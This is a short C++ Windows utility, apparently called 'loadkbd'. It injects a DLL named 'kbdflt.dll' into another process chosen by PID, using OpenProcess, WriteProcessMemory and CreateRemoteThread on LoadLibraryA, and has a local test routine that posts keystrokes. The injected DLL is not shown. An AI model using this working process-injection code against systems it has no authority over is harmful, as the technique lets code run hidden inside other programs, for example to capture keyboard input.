#include <windows.h>
#include <stdio.h>
#include <tclap/CmdLine.h>

// a simple procedure for testing..
void debug_test()
{
	LoadLibraryA("kbdflt.dll");

	printf("echo test console... (quit to exit!)");

	char line[100];
	BOOL bContinue = TRUE;

	do
	{
		fgets(line, 100, stdin);
		if (strcmp(line, "quit") == 0)
			bContinue = FALSE;

		char *sz = line;

		while (*sz != 0)
		{
			PostThreadMessage(GetCurrentThreadId(), WM_KEYDOWN, *sz, 0);
			sz++;
		}
	} while (bContinue);
}

void process_injection(DWORD dwPid)
{
	CHAR szDllPath[MAX_PATH];

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);

	LPVOID lpRemoteAddr = VirtualAllocEx(hProcess, NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);

	GetModuleFileName(NULL, szDllPath, MAX_PATH);

	char *replace = strrchr(szDllPath, '\\');

	if (replace != NULL)
	{
		replace++;
		strcpy(replace, "kbdflt.dll");
	}

	SIZE_T NumberOfBytesWritten = 0;
	WriteProcessMemory(hProcess, lpRemoteAddr, szDllPath, MAX_PATH, &NumberOfBytesWritten);

	CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)&LoadLibraryA, lpRemoteAddr, 0, NULL);
	CloseHandle(hProcess);
}

/**
 * \brief main
 **/
int main(int argc, char *argv[])
{
	TCLAP::CmdLine cmdline("loadkbd", ' ', "1.0");
	TCLAP::ValueArg<std::string> process_name("n", "processname", "Process name", false, "", "");
	TCLAP::ValueArg<int> process_pid("p", "pid", "Process pid", false, 0, "");

	cmdline.add(process_name);
	cmdline.add(process_pid);

	cmdline.parse(argc, argv);

	if (process_pid.isSet()) {
		process_injection((DWORD)process_pid.getValue());
	}
	else {
		debug_test();
	}
	
	return 0;
}